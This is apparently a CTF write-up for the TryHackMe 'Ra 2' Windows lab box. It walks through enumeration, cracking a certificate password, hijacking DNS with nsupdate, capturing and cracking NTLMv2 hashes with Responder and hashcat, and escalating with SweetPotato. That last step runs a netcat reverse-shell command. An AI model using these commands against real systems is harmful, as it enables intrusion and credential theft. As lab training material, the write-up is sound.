
# Ra 2 Writeup TryHackme (Hard).
#### Sergio Medeiros | Twitter @GRuMPzSux
![image](https://user-images.githubusercontent.com/80599694/147979402-90fbbffd-f072-4f9a-bdfc-f0584a80d3f4.png)


## Summary:
#### This is a Windows Box with a rated difficulty of "Hard" that can only be access via your TryHackMe paid subscription. This contains various stages of in-depth enumeration every step of the way including, password cracking, NTLMv2 hash capturing, exploiting with SweetPotato via Powershell Access and other fun yet challenging steps along the way!  I loved doing this box.

### Backstory:
![image](https://user-images.githubusercontent.com/80599694/147980047-20364107-8930-4965-a9b3-cbccde7c9ea6.png)

## Enumeration Phase
#### First thing is first, I decided to do a quick scan on the target with Nmap.
````bash
nmap -sV -sC -T4 -oA nmap/initial 10.10.213.222
````
![Image](https://user-images.githubusercontent.com/80599694/147980457-0791d10d-4ae6-47b9-a7ea-e258abd1d451.png)
#### Initial Nmap Output:
````bash
# Nmap 7.80 scan initiated Mon Jan  3 00:39:29 2022 as: nmap -sV -sC -T4 -oA nmap/initial 10.10.213.222
Nmap scan report for 10.10.213.222
Host is up (0.17s latency).
Not shown: 978 filtered ports
PORT     STATE SERVICE             VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http                Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://fire.windcorp.thm/
88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2022-01-03 05:39:53Z)
135/tcp  open  msrpc               Microsoft Windows RPC
139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2022-01-03T05:41:10+00:00; 0s from scanner time.
443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2022-01-03T05:41:09+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2022-01-03T05:41:09+00:00; 0s from scanner time.
2179/tcp open  vmrdp?
3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2022-01-03T05:41:11+00:00; 0s from scanner time.
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2022-01-03T05:41:09+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server       Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2022-01-02T05:31:43
|_Not valid after:  2022-07-04T05:31:43
|_ssl-date: 2022-01-03T05:41:09+00:00; 0s from scanner time.
5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
5269/tcp open  xmpp                Wildfire XMPP Client
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
7070/tcp open  http                Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
7777/tcp open  socks5              (No authentication; connection failed)
9090/tcp open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 03 Jan 2022 05:39:52 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 03 Jan 2022 05:40:02 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp open  ssl/xmltec-xmlmail?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 03 Jan 2022 05:40:14 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|_    </html>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.80%I=7%D=1/3%Time=61D28C2D%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.80%I=7%D=1/3%Time=61D28C2A%P=x86_64-pc-linux-gnu%r(Get
SF:Request,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Jan\x2020
SF:22\x2005:39:52\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\x2
SF:017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20byt
SF:es\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<met
SF:a\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>\n
SF:<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Illega
SF:l\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-88
SF:59-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x2
SF:0Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</p
SF:re>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL
SF:=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length
SF::\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><p
SF:re>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,C3
SF:,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:
SF:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection
SF::\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal
SF:\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x20
SF:400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\x2
SF:0400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;
SF:charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n
SF:\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\
SF:x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20character
SF:\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConten
SF:t-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2040
SF:0</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTPOp
SF:tions,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Jan\x202022\
SF:x2005:40:02\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.80%T=SSL%I=7%D=1/3%Time=61D28C3D%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Jan
SF:\x202022\x2005:40:14\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202
SF:020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\
SF:x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>
SF:\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</h
SF:ead>\n<body>\n</body>\n</html>\n\n");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-03T05:41:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  3 00:41:24 2022 -- 1 IP address (1 host up) scanned in 115.55 seconds
````
## Initial Enumeration Continued
#### After I doing the initial Nmap Scan, I see that Port 80 is open. Let's goto the website and check it out:
````bash
http://10.10.213.2222
````
#### However, when you try to go to the IP address it is not displaying, as it is trying to route to the hostname: https://fire.windcorp.thm
#### Add the HOSTNAME to your /etc/hosts file with the IP 10.10.213.222.
````bash
sudo nano /etc/hosts
10.10.213.222 fire.windcorp.thm
ctrl+o
ctrl+x
`````
#### However, an easier way to push this to your /etc/hosts file, you can use echo:
````bash
echo 10.10.213.222  fire.windcorp.thm >>/etc/hosts
````
#### Let's go back to the website using the hostname: fire.windcorp.thm now:
![image](https://user-images.githubusercontent.com/80599694/147981534-831be3fb-c3b6-4bb1-970d-edbf03c4c7c8.png)

#### We are off to the races.  Next thing I check for is a few quik wins.  Is there a robots.txt file?  Can I view the source and see if there are any usernames for me? No luck. ???? I decided to go back to my initial nmap scan to review as well as setup a Gobuster scan in the background.
### DNS is open? Are their more DNS?
#### Let's check the certificate
![image](https://user-images.githubusercontent.com/80599694/147982288-7a85f330-fb8a-4ed5-8b6c-8510e91421b3.png)
#### Look at that, I found two more subdomains that I need to add to the /etc/hosts file.
````bash
selfservice.windcorp.thm
selfservice.dev.windcop.thm
````
### I decided to do a DNS look up and "dig" up anything: ????
````bash
dig windcorp.thm any @10.10.213.222
````
![image](https://user-images.githubusercontent.com/80599694/147982759-b9eef036-02a3-4ae2-b55c-87b357a73e19.png)
#### Look at that, we found our First Flag as a TXT Record.

## On the hunt for flag 2, I decided to check my GoBuster log file:
````bash
gobuster -u https://fire.windcorp.thm -w /home/grumpz/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o fire.log
````
![image](https://user-images.githubusercontent.com/80599694/147983336-e068f871-7ba4-438e-ab90-f96a89908d36.png)
#### Gobuster scan finds an interesting directory, called "powershell".
````bash
https://fire.windcorp.thm/powershell
````
![image](https://user-images.githubusercontent.com/80599694/147983637-ec594ee3-a51e-423a-9623-fb095e9587a0.png)
#### Well, this is interesting, but, I do not have any credentials to login here.  Let's save this to my notes, and contiue my dir busting.

#### Decided to Dir Bust all the subdomains that I had, and when I started scanning https://selfservice.dev.windcorp.thm
![image](https://user-images.githubusercontent.com/80599694/147983843-cd6800e0-84f7-490b-b639-d96409043e3f.png)
#### I found an interesting directory called "backup"/
![image](https://user-images.githubusercontent.com/80599694/147983934-875a9732-0c59-4ea6-8b23-56e132ad81c0.png)
#### Let's visit the URL and see what we can find?  Maybe, I'll get lucky.
````bash
https://selfservice.dev.windcorp.thm/backup
````
![image](https://user-images.githubusercontent.com/80599694/147984021-0c8a3ca4-5a2d-403a-aeb7-2cb2e8dee9b9.png)

#### Awesome! ???? The directory listing shows two files that I can download:
````bash
cert.pfx
web.config
````
##### To be honest, I was not familiar with the pfx file, and I had to research to learn more about it.  But, this is why we are doing this right? To sharpen our skills! I learned that a pfx file is essentially in PKCS#12 format, which contains the SSL certificate. (public keys).  Well that's cool, what happens when I try to open it?
![image](https://user-images.githubusercontent.com/80599694/147984579-744efe89-c0dc-4306-a6d7-ef0b1fa8c56f.png)
#### Interesting, it's password protected. Can I bruteforce it? After some searching and trying a few tools, I came across the perfect tool for the job.
### Using The Crackpkcs12 Tool
#### I decided to use my rockyou.txt password list and see if we can get the password.
````bash
crackpkcs12 -d rockyou.txt cert.pfx
````
![image](https://user-images.githubusercontent.com/80599694/147984912-dc84eb82-20ea-4551-949f-9ce057cab886.png)
#### Boom! We got a password: ganteng
#### After researching more into SSL, using OpenSSL and what can be done when you have access to an SSL certificate. In a nutshell, SSL is party used to authenticate yourself to the clients connecting to your server. If someone has access to your private key, we can essentially eavesdrop on the traffic and see that data in cleartext, or we can do a man-in-the-middle attack where the data is flowing from the server-to-the-client or client-to-the-server which can allow us to modify that data in transit. This could be done to ask a user to reauthenticate (and thereby surrender their password), ask for a credit card number, or implant malware into file downloads.  With that in mind, let's see what we can do.

### Let's generate our own public and private keys with the cert.pfx file.
````bash
openssl pkcs12 -in cert.pfx -nocerts -out private.pem -nodes
````
![image](https://user-images.githubusercontent.com/80599694/147985453-986995ec-b5d6-4a55-a2c2-1615daab1f5e.png)
````bash
openssl pkcs12 -in cert.pfx -out public.pem -clcerts -nokeys
````
![image](https://user-images.githubusercontent.com/80599694/147985564-dc6d88fa-541e-4f76-a3c4-109d5c54c5e0.png)

### Now that we have a private and public key, can we update the DNS Entries?
#### Let's try nsupdate:
![image](https://user-images.githubusercontent.com/80599694/147986935-0a2043d5-40eb-4ddd-a749-7aeb2b1ec0ed.png)

#### Since we have access to update DNS Records, we are using nsupdate to send a request to delete the current A record for the selfservice.windcorp.thm domain, then sending an update add request with our own IP address as an A record to have the selfservice domain resolve to our IP.

### Let's confirm that the update worked but doing a quick dig
````bash
dig selfservice.windcorp.thm @10.10.213.222
````
![image](https://user-images.githubusercontent.com/80599694/147987419-266a4116-f1ec-47f1-9ada-4cd2f1f8bf61.png)

### Boom! Now that our IP address Resovles to the Domain, Let's steal some password hashes :)
#### If you check back to our initial nmap scan you can see that Active Directory exists. Let's fire up Responder and use our public and private keys!

### Configure and Fire up Responder!
#### We are going to need to copy our keys to the "certs" folder where you've installed Responder, and then update the Responder.conf file.
![image](https://user-images.githubusercontent.com/80599694/147988223-09264cd3-94b5-496f-b932-a3da51162204.png)
#### Now that we have copied our public and private keys, lets update the Responder.conf file.
![image](https://user-images.githubusercontent.com/80599694/147988351-695da646-44ae-4053-b173-e54a4f6492f3.png)
### Let's Fire Responder up!
#### Make sure to use the appropriate interface, given that we are using a VPN, my interface is tun0. If you do not know your interface, just run a quick ifconfig to find which interface you want Responder to run on.
![image](https://user-images.githubusercontent.com/80599694/147988558-2f37c72a-073d-4ad5-933e-3c13f5178c63.png)
#### After a couple minutes, you should be able to capture an NTLMv2 hash for the user: edwardle however, if nothing is coming through, go and visist the URL and then check your Responder.
![image](https://user-images.githubusercontent.com/80599694/147988968-ce73fa94-2034-4b28-ad0d-11b5e86d4257.png)
#### Boom!  Look at that, we captured an NTLMv2 hash! Next up, we are going to need to crack the NTLMv2 hash.
### Using Hashcat to Crack Hashes
#### Save the NTLMv2 hash to file, for me it was hash.txt, we will then use our rockyou.txt password list to attempt to crack the hash.
````bash
hashcat -m 5600 hash.txt rockyou.txt -o cracked.txt
````
![image](https://user-images.githubusercontent.com/80599694/147989174-d944da5e-d8e9-4278-ba08-75072d53ee62.png)
#### After a few minutes, depending on your GPU, you should see that you cracked the hash, and now have Edward's password.
![image](https://user-images.githubusercontent.com/80599694/147989352-14355dc1-d905-46e6-8a80-d9c9625c36b2.png)

#### Great, we have credentials.  But to what? If you look at the initial nmap scan, we do not have an SSH open, or anything these credentials can be used for. But if you remember our GoBuster enumeration finding the URL https://fire.windcorp.thm/powershell - Let's try our credentials there.
![image](https://user-images.githubusercontent.com/80599694/147991544-8d3fcccb-9b02-4043-93ff-d50bacf12a98.png)
#### Well look at that, we've got access!
![image](https://user-images.githubusercontent.com/80599694/147991646-1856ecd6-e091-45ac-95ef-30c751673a02.png)
#### Now that we have a foothold, let's look for that second flag.
![image](https://user-images.githubusercontent.com/80599694/147991691-796ba33d-f34d-49b0-868c-10214f8d407a.png)
#### Great!  We found the user flag, (flag 2), but how do I become admin?  I'm always looking for easy wins on CTF boxes, the first thing I am going to do is check my privileges:
`````bash
whoami /priv
`````
![image](https://user-images.githubusercontent.com/80599694/147991804-4aed2d4d-437a-4b62-b387-c590618c9bd4.png)
#### Looks like we can escalate privlieges with Sweet Potato.  Well, thats what it reminds me of atleast.

## Let's get Admin Priv's!
#### After I checked my priv's I went poking around the directories, and made my way to the Downloads folder.
![image](https://user-images.githubusercontent.com/80599694/147991980-6f1571d2-32d3-4744-aaea-26f81f877b6a.png)
#### Awesome! In the directory, there is already nc.exe (reverse shell opportunity) and SweetPotato. What do you know? ????
#### I am going to setup a netcat listener on my machine and get the machine to connect back after running SweetPotato.
````bash
rlwrap nc -lvnp 4445
````
#### Now Let's Run SweetPotato.exe
````bash
.\SweetPotato.exe -p nc.exe -a "-e cmd 10..13.12.249 4445"
````
![image](https://user-images.githubusercontent.com/80599694/147992256-28dec5c2-f0ca-4083-84ae-14f0fc25cf1a.png)
#### Well, it looks like SweetPotato was successful, we should go back to our terminal and check to see if we have a connection with Admin rights through our listener.
![image](https://user-images.githubusercontent.com/80599694/147992381-92f0c62d-a5ee-4167-85cf-bd9d53fb4bf9.png)
#### We got a shell!  Let's go get that Admin flag and finish the box.
![image](https://user-images.githubusercontent.com/80599694/147992438-f6e910b4-ed9b-4c67-a945-8adb06404bf2.png)

